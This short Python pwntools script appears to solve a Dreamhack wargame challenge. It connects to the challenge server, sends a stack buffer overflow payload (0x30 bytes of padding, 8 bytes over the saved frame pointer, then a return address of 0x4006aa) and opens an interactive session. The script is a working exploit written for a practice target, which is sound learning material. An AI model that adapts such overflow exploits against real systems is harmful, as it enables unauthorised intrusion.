from pwn import *

p = remote("host1.dreamhack.games", 24506)

payload  = b"A" * 0x30
payload += b"B" * 0x8
payload += p64(0x4006aa)

p.recvuntil("Input: ")
p.sendline(payload)
p.interactive()
